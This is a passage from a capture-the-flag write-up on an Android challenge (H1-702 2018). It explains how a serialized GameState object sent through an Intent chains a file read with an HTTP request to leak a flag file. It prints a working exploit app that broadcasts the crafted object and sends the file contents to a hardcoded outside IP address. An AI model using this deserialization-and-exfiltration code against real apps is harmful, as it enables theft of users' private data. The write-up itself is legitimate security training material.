  }
  catch (IOException paramContext)
  {
    paramContext.printStackTrace();
  }
  catch (FileNotFoundException paramContext)
  {
    paramContext.printStackTrace();
  }
}
```

Here is the money! Instead of using openFileInput, it uses the File and FileReader classes. That means it will read a file of any path. In addition, we control the stringRef variable, so we can make this function read in the flag file easily by setting stringRef to /data/local/tmp/challenge4. The flag is read into the stringVal variable. Now the problem is, how do we exfiltrate this flag?

Scrolling down a bit we see the save() function in BroadcastAnnouncer:

```java
public void save(Context context, Object obj) {
    new Thread() {
        public void run() {
            HttpURLConnection httpURLConnection;
            try {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(BroadcastAnnouncer.this.destUrl);
                stringBuilder.append("/announce?val=");
                stringBuilder.append(BroadcastAnnouncer.this.stringVal);
                httpURLConnection = (HttpURLConnection) new URL(stringBuilder.toString()).openConnection();
                new BufferedInputStream(httpURLConnection.getInputStream()).read();
                httpURLConnection.disconnect();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            } catch (Throwable th) {
                httpURLConnection.disconnect();
            }
        }
    }.start();
}
```

This sends a request to destUrl with the value of stringVal. This seems like the perfect function for exfiltration since we control destUrl, and the flag is read into stringVal. It's almost as if it's screaming "call me and you will win." However, how do we call it. Tracing the save() function, we see that it gets called by GameState's finalize() function if we have completed the maze more than twice:

```java
public void finalize()
{
  Log.d("GameState", "Called finalize on GameState");
  if ((GameManager.levelsCompleted > 2) && (this.context != null)) {
    this.stateController.save(this.context, this);
  }
}
```

Now following the same logic, how do we call finalize()? StackOverflow, our second best friend after Google, tells us [this](https://stackoverflow.com/questions/2506488/when-is-the-finalize-method-called-in-java):

```
In general it's best not to rely on finalize() to do any cleaning up etc.

According to the Javadoc (which it would be worth reading), it is:

Called by the garbage collector on an object when garbage collection determines that there are no more references to the object.
```

The GameState object we passed through the Intent is never used again, so it calls finalize automatically. Easy. So now we have our attack plan:

1. Create GameState object with a BroadcastAnnouncer object with destUrl pointing to our server, and stringRef pointing to the flag path.
2. Solve the maze 3 times
3. Pass this object through an Intent to the app with the extra cereal
4. Collect the flag on our server!

We can solve the maze using [Breadth First Search](https://en.wikipedia.org/wiki/Breadth-first_search), and write the Intent in an Android app. Here is my code to do this.

```java
package alex.com.win;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Environment;
import android.support.v4.content.FileProvider;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.hackerone.mobile.challenge4.BroadcastAnnouncer;
import com.hackerone.mobile.challenge4.GameState;
import com.hackerone.mobile.challenge4.StateController;
import com.hackerone.mobile.challenge4.StateLoader;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Queue;
import android.os.Handler;

public class MainActivity extends AppCompatActivity {

    static boolean[][] walls;
    static ArrayList position;

    static int moves;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        Intent start = new Intent();
        start.setAction("com.hackerone.mobile.challenge4.menu");
        start.putExtra("start_game", "");
        sendBroadcast(start);

        try {
            Thread.sleep(1000);
        } catch (Exception e) {

        }


        registerReceiver(new BroadcastReceiver()
        {
            public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
            {
                getsice(paramAnonymousContext, paramAnonymousIntent);
            }
        }, new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));

        start = new Intent();
        start.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        start.putExtra("get_maze", "");
        sendBroadcast(start);
        try {
            Thread.sleep(1000);
        } catch (Exception e) {

        }
        Log.d("DONE", "DONE");

    }

    public int hash(int x, int y) {
        return x * 6969 + y;
    }

    static boolean waitforresult = false;
    static int lastposX = -1, lastposY = -1, moveCount = 0;

    public void getsice(Context con, Intent intent) {
        //System.out.println("RECEIVED SOMETHING");
        Object dank = intent.getExtras();
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            for (String key : bundle.keySet()) {
                Object value = bundle.get(key);
                if (key.equals("positions")) {
                    ArrayList pos = (ArrayList) value;
                    MainActivity.position = pos;
                    //System.out.println(pos.toString());
                    int curX = (int)position.get(1);
                    int curY = (int)position.get(0);
                    if (lastposX != curX || lastposY != curY) {
                        lastposX = curX;
                        lastposY = curY;
                        waitforresult = false;
                    }
                }
                if (key.equals("walls")) {
                    boolean[][] walldic = (boolean[][]) value;
                    MainActivity.walls = walldic;
                }
            }
        }
        if (position != null && !waitforresult) {
            bfs();
            Intent start = new Intent();
            start.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            start.putExtra("get_maze", "");
            sendBroadcast(start);
        }
        if (moveCount > 200) {
            Serializable bigDicc = new GameState("bigdicc", new BroadcastAnnouncer("/data/local/tmp/challenge4", "/data/local/tmp/challenge4", "http://167.99.163.197"));
            intent=new Intent();
            intent.putExtra("cereal", bigDicc);

            intent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            for (int i = 0; i < 100; i++) {
                System.out.println(i);
                sendBroadcast(intent);

            }
            //System.out.println("WIN");
            System.exit(0);
        }
    }

    static int lastMap = -1;
    static HashMap<Integer, Integer> savedDic = null;

    public int hashMaze() {
        int res = 0;
        for (int i = 0; i < walls.length; i++) {
            for (int a = 0; a < walls[i].length; a++) {
                if (walls[i][a]) {
                    res += (i+1) * (a+1);
                }
            }
        }
        return res;
    }

    public void bfs() {
        waitforresult = true;
        moveCount++;
        int curX = (int)position.get(1);
        int curY = (int)position.get(0);
        int endX = (int)position.get(3);
        int endY = (int)position.get(2);
        if (lastMap == hashMaze()) {
            Integer cur = hash(endX, endY);
            while (savedDic.get(cur) != hash(curX, curY)) {
                cur = savedDic.get(cur);
            }
            int toMoveX = cur / 6969, toMoveY = cur % 6969;
```

---

*Truncated at 1200 lines. Full text: <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2018/h1-702-ctf-2018/voidmercy/README.md>*
